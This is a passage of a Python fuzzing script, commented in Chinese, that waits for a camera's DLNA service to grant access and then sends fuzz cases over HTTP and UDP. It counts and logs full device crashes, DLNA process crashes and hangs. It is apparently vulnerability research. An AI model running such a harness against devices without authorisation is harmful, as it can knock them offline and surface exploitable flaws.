        elif args[i] == "--count":
            count = int(args[i + 1]); i += 2
        elif args[i] == "--rearm":
            rearm = True; i += 1
        elif args[i] == "--cleanup":
            cleanup = True; i += 1
        else:
            i += 1
    if strategy not in STRATEGIES:
        print(f"unknown strategy {strategy}; choose from {list(STRATEGIES)}")
        sys.exit(1)

    os.makedirs("crash_cases", exist_ok=True)
    LOGFILE = f"fuzz_log_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
    print(f"[*] 目标 {cam}  strategy={strategy}  日志 {LOGFILE}")

    if cleanup:
        do_cleanup(cam)

    # 等授权（仅 dlna 判据；只读，不发 accctrl）
    print("[*] 等待 dlna 放行（200/500=放行，403=未放行）...")
    while True:
        a, d = auth_status(cam)
        if a == "ok":
            print(f"[+] 已放行（HTTP {d}），开始 fuzz\n")
            break
        elif a == "denied":
            if rearm:
                if do_rearm(cam):
                    continue
                sys.exit(2)
            print(f"    [403 未放行] 请先跑 handshake.py（或在相机屏幕点【允许】）。5s 后重查...")
            time.sleep(5)
        else:
            print(f"[!] 相机不可达（{d}）：相机不在线/不在回放模式。5s 后重查...")
            time.sleep(5)

    sent = 0
    ncrash = ndown = nhang = 0
    gen = STRATEGIES[strategy](cam) if callable(STRATEGIES[strategy]) else None
    for name, item in gen:
        kind, payload = item
        if kind == "dl":
            body_bytes = payload.encode()
        else:
            body_bytes = payload.get("raw") or payload.get("data") or b""
        if kind != "dl":
            dlna_touch(cam)          # ★ 保活：非 dlna 用例族之间补心跳（14:52 教训）
        t0 = time.time()
        err, status, resp_head, dt = send_one(cam, kind, payload)
        sent += 1
        flag = ""
        if err is None:
            flag = f"[HTTP {status}]" if status is not None else "[udp sent]"
        else:
            tag = on_connection_error(cam, name, err, body_bytes)
            if tag == "crash":
                ncrash += 1
            elif tag == "dlna_down":
                ndown += 1
            elif tag == "hang":
                nhang += 1
            flag = f"[{tag or 'skip'}]"
        if kind == "dl":
            global _last_dlna_touch
            _last_dlna_touch = time.time()
        logline(case=name, kind=kind, bytes=len(body_bytes), dt=round(dt, 3),
                err=err, status=status, resp=resp_head[:80].decode("latin1") if resp_head else None)
        if count and sent >= count:
            break
        if sent % 25 == 0 or ncrash or ndown:
            print(f"[i] 已发 {sent}  崩溃={ncrash} dlna_down={ndown} hang={nhang}  最后: {name} {flag} {dt:.2f}s")
        time.sleep(0.25)

    print(f"\n[*] 完成：共 {sent} 个用例。整机崩溃={ncrash} dlna进程崩溃={ndown} 挂起={nhang}")
    print(f"    日志: {LOGFILE}；崩溃输入: crash_cases/")


if __name__ == "__main__":
    main()
